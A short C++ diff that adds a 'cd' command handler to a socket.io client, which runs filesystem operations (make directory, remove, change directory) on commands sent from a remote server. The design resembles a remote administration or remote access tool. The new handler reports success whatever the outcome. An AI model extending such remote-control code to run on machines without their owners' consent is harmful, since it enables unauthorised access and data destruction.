@@ -94,6 +94,8 @@ namespace silence
             mkDirEvent(commandObject);
         else if (event == "remove")
             removeEvent(commandObject);
+        else if (event == "cd")
+            cdEvent(commandObject);
         else
             response(event, SIOSTR("Unknown event"));
     }
@@ -180,6 +182,12 @@ namespace silence
     void Client::removeEvent(const CommandObject &object)
     {
         response("remove", SIOBOOL(fs::remove(object.at("path")->get_string())));
+    }
+
+    void Client::cdEvent(const CommandObject &object)
+    {
+        fs::current_path(object.at("path")->get_string());
+        response("cd", SIOBOOL("True"));
     }
 
     void Client::response(const std::string &event, const sio::message::list &msg)
